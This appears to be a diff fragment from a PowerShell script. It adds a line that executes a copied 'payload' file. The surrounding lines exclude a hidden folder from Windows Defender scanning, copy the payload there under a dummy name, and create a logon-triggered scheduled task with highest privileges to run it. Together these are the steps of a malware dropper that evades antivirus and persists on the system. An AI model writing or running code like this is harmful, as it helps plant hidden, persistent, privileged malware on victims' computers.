@@ -16,4 +16,5 @@ if (!(Test-Path "$hidden_path")){
 Add-MpPreference -ExclusionPath "$hidden_path"
 Copy-Item "$cwd_path\payload.txt" -Destination "$hidden_path\$dummy_name"
 schtasks /create /tn $dummy_name_no_exe /tr "$hidden_path\$dummy_name" /sc onlogon /rl HIGHEST /f
+.\"$hidden_path\$dummy_name"
 pause
